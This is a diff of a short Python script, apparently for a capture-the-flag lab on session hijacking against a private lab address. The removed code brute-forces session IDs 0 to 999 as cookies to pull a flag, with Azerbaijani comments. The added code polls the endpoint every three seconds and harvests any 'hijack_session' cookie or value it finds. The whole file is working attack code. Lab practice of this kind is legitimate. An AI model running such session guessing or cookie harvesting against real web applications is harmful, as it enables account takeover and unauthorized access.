@@ -1,23 +1,28 @@
 import requests
+import time
 
-# Hədəf URL
-url = "http://10.42.66.32/a1/hijack_session"
+url = "http://10.42.141.99/a1/hijack_session"
 
-# Mümkün session ID-ləri sınamaq üçün siyahı
-# Lab üçün çox güman ki, sadə artan rəqəmlərdir
-for i in range(1000):  # 0-dan 999-a qədər test edirik
-    session_id = f"{i}"  # pattern düzgün olarsa buraya dəyişdirin
-    cookies = {"hijack_session": session_id}
+while True:
+    try:
+        response = requests.get(url, timeout=5)
+        session_value = None
 
-    # Sorğu göndər
-    response = requests.get(url, cookies=cookies)
+        # Check if the cookie contains hijack_session
+        if response.cookies.get("hijack_session"):
+            session_value = response.cookies.get("hijack_session")
 
-    # Flag-i axtar
-    if "FLAG" in response.text or "flag" in response.text:
-        print(f"[+] Flag tapıldı: {response.text.strip()}")
-        # Flag-i fayla yaz
-        with open("0-flag.txt", "w") as f:
-            f.write(response.text.strip())
-        break
-else:
-    print("[-] Flag tapılmadı. Pattern düzgün deyil və ya range azdır.")
+        # Check if the response text contains hijack_session
+        elif "hijack_session" in response.text:
+            start = response.text.find("hijack_session")
+            session_value = response.text[start:start + 50]
+
+        if session_value:
+            print(f"[Session] hijack_session = {session_value}")
+        else:
+            print("[-] No hijack_session found")
+
+    except requests.exceptions.RequestException as e:
+        print("[-] Error:", e)
+
+    time.sleep(3)
